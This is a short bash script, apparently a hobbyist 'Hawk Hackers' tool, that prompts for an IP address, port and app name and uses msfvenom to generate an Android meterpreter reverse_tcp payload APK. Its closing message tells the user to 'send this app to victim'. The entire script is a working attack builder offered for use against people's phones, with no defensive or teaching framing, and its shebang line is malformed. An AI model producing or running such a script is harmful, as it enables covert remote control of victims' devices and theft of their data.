#!bin/bash
figlet Hawk Hackers
cowsay Create Metasploit Payload
cowsay Android Payload Creator
echo "Enter Your ip: "
read ip
echo "Your"$ip
echo "Enter port: "
read port
echo "Your"$port
echo "Name Your app: "
read app
echo "Your"$app
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > /sdcard/$app.apk
figlet Done Bro
cowsay Check Your sdcard or internal storage
cowsay send this app to victim
